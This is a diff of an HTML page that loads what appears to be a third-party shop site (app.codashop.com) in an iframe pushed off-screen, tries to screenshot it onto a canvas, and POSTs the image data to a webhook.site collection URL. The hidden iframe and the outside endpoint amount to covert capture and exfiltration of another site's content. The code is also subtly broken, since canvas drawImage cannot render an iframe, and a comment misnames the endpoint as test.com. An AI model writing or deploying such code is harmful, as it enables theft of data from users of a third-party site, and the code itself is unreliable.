@@ -1,19 +1,23 @@
 <!DOCTYPE html>
 <html>
 <head>
-  <title>Capture and Senodsss Image</title>
+  <title>Capture and Send Image</title>
   <script>
     function captureAndSendImage() {
       var iframe = document.getElementById('myIframe');
-
-      // Retrieve the content window of the iframe
       var iframeWindow = iframe.contentWindow || iframe.contentDocument.defaultView;
       
-      // Execute a function within the iframe to capture and send the image
-      iframeWindow.postMessage('captureImage', 'https://app.codashop.com');
-    }
-
-    function sendCapturedImage(imageData) {
+      // Capture the screenshot of the first rendered content in the iframe
+      var canvas = document.createElement('canvas');
+      canvas.width = iframe.offsetWidth;
+      canvas.height = iframe.offsetHeight;
+      
+      var context = canvas.getContext('2d');
+      context.drawImage(iframe, 0, 0, iframe.offsetWidth, iframe.offsetHeight, 0, 0, iframe.offsetWidth, iframe.offsetHeight);
+      
+      // Convert the canvas image to a base64 data URL
+      var imageData = canvas.toDataURL('image/png');
+      
       // Send the image data to the server-side endpoint on test.com
       var xhr = new XMLHttpRequest();
       xhr.open('POST', 'https://webhook.site/64f44dae-4f64-45a2-a827-43ca1c61a785', true);
@@ -21,22 +25,21 @@
       xhr.onreadystatechange = function() {
         if (xhr.readyState === 4 && xhr.status === 200) {
           console.log('Image sent successfully!');
+          alert('Image sent successfully!');
+        } else if (xhr.readyState === 4) {
+          console.error('Failed to send the image. Status: ' + xhr.status);
+          alert('Failed to send the image. Please try again.');
         }
       };
       xhr.send(JSON.stringify({ image: imageData }));
     }
-
-    // Listen for the message from the iframe
-    window.addEventListener('message', function(event) {
-      if (event.origin === 'https://app.codashop.com') {
-        // Image capture data received from the iframe
-        var imageData = event.data;
-
-        // Call the sendCapturedImage function to send the image data
-        sendCapturedImage(imageData);
-      }
-    });
   </script>
+  <style>
+    #myIframe {
+      position: absolute;
+      left: -9999px;
+    }
+  </style>
 </head>
 <body>
   <h1>Capture and Send Image</h1>
